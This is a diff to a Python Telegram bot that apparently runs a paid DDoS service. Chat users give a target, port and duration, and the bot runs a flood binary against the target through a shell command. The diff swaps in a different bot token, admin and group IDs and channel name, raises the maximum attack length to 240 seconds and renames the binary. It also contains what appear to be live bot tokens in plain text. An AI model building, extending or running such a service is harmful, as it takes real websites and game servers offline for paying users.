@@ -8,15 +8,15 @@ import aiohttp
 import threading
 import random
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7970036127:AAEoiP59YmvuxDsuf_JEP6LsPaqh_6ihipI') #bot token dalo
+bot = telebot.TeleBot('7210561375:AAHtR-7ugsgJW_YmtnMP5OxXzBcJsyJpjuk') #bot token dalo
 
 
 # Admin user IDs
-admin_id = ["7584228621"]
+admin_id = ["5486683891"]
 
 # Group and channel details
-GROUP_ID = "-1002224465890"            #group id dalo
-CHANNEL_USERNAME = "@golempaidddos"         #channel username 
+GROUP_ID = "-1002319159896"            #group id dalo
+CHANNEL_USERNAME = "@Papu37"         #channel username 
 
 # Default cooldown and attack limits
 COOLDOWN_TIME = 10  # Cooldown in seconds
@@ -134,8 +134,8 @@ def handle_attack(message):
         bot.reply_to(message, "❌ **𝐄𝐑𝐑𝐎𝐑:** 𝐏𝐎𝐑𝐓 𝐀𝐍𝐃 𝐓𝐈𝐌𝐄 𝐌𝐔𝐒𝐓 𝐁𝐄 𝐈𝐍𝐓𝐄𝐆𝐄𝐑𝐒!")
         return
 
-    if time_duration > 169:
-        bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 169𝐬!**")
+    if time_duration > 240:
+        bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 240𝐬!**")
         return
 
     # Get the user's profile picture
@@ -161,7 +161,7 @@ def handle_attack(message):
 
     pending_feedback[user_id] = True  
 
-    full_command = f"./golemop {target} {port} {time_duration} 800"
+    full_command = f"./bgmi {target} {port} {time_duration} 900"
 
     try:
         subprocess.run(full_command, shell=True, check=True)
